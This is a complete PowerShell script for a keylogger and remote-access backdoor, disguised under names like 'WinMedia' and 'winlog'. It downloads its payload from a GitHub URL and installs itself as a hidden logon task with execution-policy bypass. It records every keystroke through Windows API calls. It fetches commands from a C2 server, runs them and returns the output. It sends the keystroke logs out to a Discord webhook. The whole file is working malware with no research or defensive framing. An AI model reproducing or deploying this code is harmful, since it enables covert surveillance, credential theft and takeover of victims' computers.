param([string]$PCName, [string]$WebhookUrl, [string]$C2Url, [string]$logFile)

$dir = "$env:LOCALAPPDATA\WinMedia"
if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }

$localScript = "$dir\winlog.ps1"
$configFile  = "$dir\config.txt"

# --- PART 1: THE RUNTIME INSTALLER ---
# If the script is running from the internet, install it and configure persistence
if ($MyInvocation.MyCommand.Name -ne "winlog.ps1") {
    
    # Save the execution configurations plainly to a text file
    $PCName, $WebhookUrl, $C2Url | Set-Content -Path $configFile -Force
    
    # Copy this exact file directly to the persistent path
    $rawPayload = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/chaseethecat/raw/refs/heads/main/ps.ps1')
    Set-Content -Path $localScript -Value $rawPayload -Force

    # Wipe older tasks cleanly
    schtasks /delete /tn "WinMediaLog" /f 2>&1 | Out-Null

    # Register the task to point cleanly to the local file
    schtasks /create /f /tn "WinMediaLog" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localScript`"" /sc onlogon
    schtasks /run /tn "WinMediaLog"
    exit
}

# --- PART 2: THE SECURE OPERATIONAL LOOP (winlog.ps1) ---
if (Test-Path $configFile) {
    $cfg = Get-Content -Path $configFile
    $PCName     = $cfg[0]
    $WebhookUrl = $cfg[1]
    $C2Url      = $cfg[2]
    $logFile    = "$dir\data.txt"
} else { exit }

if (!(Test-Path $logFile)) { New-Item $logFile -Type File | Out-Null }

# Plain C# execution code string - no escaped backticks, no string nesting conflicts
$C2Code = 'using System; using System.Text; using System.Runtime.InteropServices; public class KeyEngine { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState); [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType); [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags); }'
Add-Type -TypeDefinition $C2Code -ErrorAction SilentlyContinue

$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while ($true) {
    # 1. KEYLOGGER LOOP
    for ($i = 1; $i -le 254; $i++) {
        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
            $keyText = ""
            switch ($i) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                16  { $keyText = "" } 
                17  { $keyText = " [CTRL] " }
                18  { $keyText = " [ALT] " }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                default {
                    $keyState = New-Object byte[] 256
                    [KeyEngine]::GetKeyboardState($keyState) | Out-Null
                    $scanCode = [KeyEngine]::MapVirtualKey($i, 0)
                    $buffer = New-Object System.Text.StringBuilder 5

                    $rc = [KeyEngine]::ToUnicode($i, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
                    if ($rc -gt 0) { $keyText = $buffer.ToString() }
                }
            }
            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # 2. C2 SERVER POLLING
    if ($c2Interval -ge 500) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                Invoke-RestMethod -Uri "${C2Url}/send_res?id=${PCName}" -Method Post -Body @{ output = $output } -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # 3. DISCORD EXFILTRATION
    if ($discordInterval -ge 6000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    Start-Sleep -m 10
    $c2Interval += 10
    $discordInterval += 10
}
